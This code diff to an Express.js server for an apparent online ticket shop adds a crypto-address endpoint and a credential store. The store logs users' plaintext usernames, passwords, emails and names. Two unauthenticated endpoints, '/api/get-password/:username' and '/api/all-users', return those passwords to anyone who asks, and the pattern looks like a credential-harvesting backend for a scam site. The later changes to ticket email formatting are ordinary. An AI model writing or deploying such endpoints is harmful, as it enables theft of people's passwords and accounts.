@@ -57,10 +57,96 @@ app.get('/api/stripe-config', (req, res) => {
     res.json({ publishableKey: process.env.STRIPE_PUBLISHABLE_KEY });
 });
 
+app.get('/api/crypto-addresses', (req, res) => {
+    res.json({
+        success: true,
+        addresses: CRYPTO_ADDRESSES,
+        networks: CRYPTO_NETWORKS
+    });
+});
+
+// ✅ RESTORED: Detailed Store Credentials Logic
 app.post('/api/store-credentials', (req, res) => {
-    const { username, password, email, name } = req.body;
-    userCredentials.push({ username, password, email, name });
-    res.json({ success: true });
+    try {
+        const { username, password, email, name } = req.body;
+        
+        console.log('🔐 Storing credentials:', { username, password, email, name });
+        
+        // Check if user already exists
+        const existingUserIndex = userCredentials.findIndex(user => user.username === username || user.email === email);
+        
+        if (existingUserIndex !== -1) {
+            // Update existing user
+            userCredentials[existingUserIndex] = {
+                username,
+                password, 
+                email,
+                name,
+                timestamp: new Date().toISOString()
+            };
+        } else {
+            // Add new user
+            userCredentials.push({
+                username,
+                password, 
+                email,
+                name,
+                timestamp: new Date().toISOString()
+            });
+        }
+        
+        console.log('✅ Credentials stored successfully');
+        
+        res.json({
+            success: true,
+            message: 'Credentials stored successfully'
+        });
+        
+    } catch (error) {
+        console.error('❌ Error storing credentials:', error);
+        res.json({
+            success: false,
+            message: error.message
+        });
+    }
+});
+
+// ✅ RESTORED: Get Password Endpoint
+app.get('/api/get-password/:username', (req, res) => {
+    try {
+        const { username } = req.params;
+        const user = userCredentials.find(u => u.username === username);
+        
+        if (user) {
+            res.json({
+                success: true,
+                username: user.username,
+                password: user.password, 
+                email: user.email,
+                name: user.name,
+                timestamp: user.timestamp
+            });
+        } else {
+            res.status(404).json({ success: false, message: 'User not found' });
+        }
+    } catch (error) {
+        console.error('❌ Error retrieving password:', error);
+        res.json({ success: false, message: error.message });
+    }
+});
+
+// ✅ RESTORED: Get All Users Endpoint
+app.get('/api/all-users', (req, res) => {
+    try {
+        res.json({
+            success: true,
+            count: userCredentials.length,
+            users: userCredentials
+        });
+    } catch (error) {
+        console.error('❌ Error retrieving users:', error);
+        res.json({ success: false, message: error.message });
+    }
 });
 
 app.post('/api/process-payment', async (req, res) => {
@@ -129,13 +215,20 @@ app.post('/api/send-confirmation', async (req, res) => {
 
 // HTML Generator
 function generateTicketEmail(customer, tickets, payment, transactionId, paymentMethod) {
-    const ticketList = tickets.map(t => 
-        `<div style="border:1px solid #ccc; padding:10px; margin:10px 0;">
+    const ticketList = tickets.map(t => {
+        // Fix: Calculate quantity logic (defaults to 1 if undefined)
+        const qty = t.quantity || 1;
+        const price = t.price || 0;
+        const total = price * qty;
+        
+        return `<div style="border:1px solid #ccc; padding:10px; margin:10px 0;">
             <strong>${t.match.teams}</strong><br>
             ${t.match.venue}<br>
-            ${t.category.name}
-         </div>`
-    ).join('');
+            ${t.category.name}<br>
+            Quantity: ${qty} <br>
+            Price: USD ${total.toLocaleString()}
+         </div>`;
+    }).join('');
 
     return `
         <h1>Ticket Confirmation</h1>
@@ -144,7 +237,7 @@ function generateTicketEmail(customer, tickets, payment, transactionId, paymentM
         <h3>Your Tickets:</h3>
         ${ticketList}
         <p><strong>Transaction ID:</strong> ${transactionId}</p>
-        <p><strong>Total Paid:</strong> USD ${payment.amount || 'Paid'}</p>
+        <p><strong>Total Paid:</strong> USD ${payment.amount ? payment.amount.toLocaleString() : 'Paid'}</p>
     `;
 }
 
